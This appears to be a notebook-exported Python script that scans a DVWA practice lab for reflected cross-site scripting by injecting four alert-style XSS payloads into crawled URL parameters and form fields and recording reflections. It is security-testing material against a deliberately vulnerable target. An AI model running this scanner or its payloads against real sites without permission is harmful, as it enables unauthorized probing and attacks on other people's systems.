#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import json
import requests
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

with open("dvwa_crawler_output.json", "r") as f:
    crawl_results = json.load(f)

forms_by_url = crawl_results["forms"]
pages_by_url = crawl_results["pages"]



xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert('XSS');//"
]



class XSSTester:
    def __init__(self, session=None, timeout=5):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.findings = []

    def test_url_params(self, url):
        """Inject XSS payloads into URL parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return

        for param in params:
            for payload in xss_payloads:
                new_params = params.copy()
                new_params[param] = payload

                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                try:
                    resp = self.session.get(new_url, timeout=self.timeout)
                    if payload in resp.text:
                        finding = {
                            "type": "XSS in URL",
                            "url": new_url,
                            "param": param,
                            "payload": payload
                        }
                        self.findings.append(finding)
                        print("[+] Possible XSS found in URL:", new_url)
                except Exception as e:
                    print("Error testing URL:", new_url, "->", e)

                time.sleep(0.1)

    def test_forms(self, forms):

        for form in forms:
            action = form["action"]
            method = form["method"]
            inputs = form["inputs"]

            for inp in inputs:
                if not inp["name"]:
                    continue

                for payload in xss_payloads:
                    data = {i["name"]: "test" for i in inputs if i["name"]}
                    data[inp["name"]] = payload

                    try:
                        if method == "POST":
                            resp = self.session.post(action, data=data, timeout=self.timeout)
                        else:
                            resp = self.session.get(action, params=data, timeout=self.timeout)

                        if payload in resp.text:
                            finding = {
                                "type": "XSS in Form",
                                "url": action,
                                "param": inp["name"],
                                "payload": payload
                            }
                            self.findings.append(finding)
                            print("[+] Possible XSS found in form at:", action)

                    except Exception as e:
                        print("Error submitting form:", action, "->", e)

                    time.sleep(0.1)

    def run(self, pages, forms):
        for url in pages.keys():
            self.test_url_params(url)

        self.test_forms(forms)
        return self.findings



if __name__ == "__main__":
    session = requests.Session()
    tester = XSSTester(session=session)

    results = tester.run(pages_by_url, forms_by_url)

    with open("xss_results.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n XSS Testing Complete!")
    print("Total Findings:", len(results))
    if results:
        print("Sample finding:", results[0])


# In[ ]:



